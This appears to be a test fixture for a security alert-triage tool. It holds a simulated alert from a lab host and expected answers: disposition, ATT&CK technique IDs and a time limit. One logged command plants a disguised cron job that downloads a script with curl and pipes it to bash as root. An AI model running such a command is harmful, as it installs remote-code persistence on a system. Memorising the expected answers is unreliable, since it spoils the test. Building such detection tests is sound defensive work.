@@ -1,0 +1,36 @@
+{
+  "search_name": "SPARKSOC - Linux Suspicious Activity",
+  "sid": "validate_linux_001",
+  "result_count": 2,
+  "trigger_time": 0,
+  "severity": "high",
+  "results": [
+    {
+      "_time": "2026-08-18T10:03:17.220Z",
+      "host": "RHEL-RANGE-11",
+      "user": "root",
+      "comm": "bash",
+      "exe": "/usr/bin/bash",
+      "cmdline": "bash -c 'echo \"*/5 * * * * root curl -s http://10.90.99.5/p.sh | bash\" >> /etc/cron.d/systemd-update'",
+      "auid": "1004",
+      "syscall": "execve",
+      "key": "persistence"
+    },
+    {
+      "_time": "2026-08-18T10:03:19.910Z",
+      "host": "RHEL-RANGE-11",
+      "user": "root",
+      "comm": "chmod",
+      "exe": "/usr/bin/chmod",
+      "cmdline": "chmod 644 /etc/cron.d/systemd-update",
+      "auid": "1004",
+      "syscall": "execve",
+      "key": "perm_mod"
+    }
+  ],
+  "_expect": {
+    "disposition": ["suspicious", "malicious"],
+    "techniques": ["T1053.003", "T1053", "T1059.004", "T1105"],
+    "max_fast_ms": 15000
+  }
+}
